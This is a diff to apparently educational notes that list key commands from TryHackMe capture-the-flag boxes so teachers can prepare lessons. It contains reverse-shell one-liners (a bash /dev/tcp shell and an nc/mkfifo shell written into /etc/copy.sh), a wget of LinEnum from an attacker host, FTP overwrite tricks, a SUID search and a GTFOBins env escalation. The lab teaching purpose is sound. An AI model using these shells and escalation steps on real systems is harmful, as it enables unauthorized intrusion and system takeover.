@@ -1,3 +1,7 @@
+<h1>Key commands listed under each box</h1>
+</br> by listing key commands, this will help teachers present relevant material PRIOR to getting students to try a box
+</br> I won't repeat the super-common stuff, but the main ideas.
+</br> by looking for various concepts, you can better organize teaching materials, AND find boxes that demonstrate them
 <h2>Purpose</h2>
 </br> Shows complete list of commands at the start of the walkthrough (quick overview and command/syntax refresher)
 </br> documents the notes I make in a report while pen-testing a box.
@@ -28,3 +32,24 @@ wget http://<ip.attacker>:8080/LinEnum.sh
 - use php reverse shell and set up netcat to catch the shell https://github.com/pentestmonkey/php-reverse-shell
 - sudo -l (finds) backup.pl (which calls) /etc/copy.sh (which runs a reverse shell of its own out to some ip, presumably for serving backup data)
 - overwrite copy.sh file via CLI --> echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.253.178 5554 >/tmp/f" > /etc/copy.sh
+
+</br> Anonymous(v6) (tryHackMe)
+- Ftp anonymous login
+</br> ftp <ip>
+</br> username: anonymous
+</br> Pass: anonymous 
+- ftp commands
+</br> <b>prompt off</b>
+</br> (transfer files without asking for confirmation)
+</br> <b>Binary </b>
+</br> (make sure binary transfer is made so ASCII doesn’t mess up file contents)
+</br> <b>Mget *</b>
+- one-liner reverse shell, listening on port 1776
+</br> <b> bash -i >& /dev/tcp/<ip.for.atk>/1776 0>&1</b>
+- ftp overwrite via "put"
+</br> The ftp command “put” will overwrite a file of the same name if put in the same <dir>. This allows you to delete or replace logic continued in a file via this “same-name put-overwrite”
+- Check programs with suid bit set
+<b>find / -type f -perm -04000 -ls 2>/dev/null</b>
+- /env is a priority if found with suid bit set
+</br> From GTFO bins
+</br> <b>/path/to/env /bin/sh -p</b>
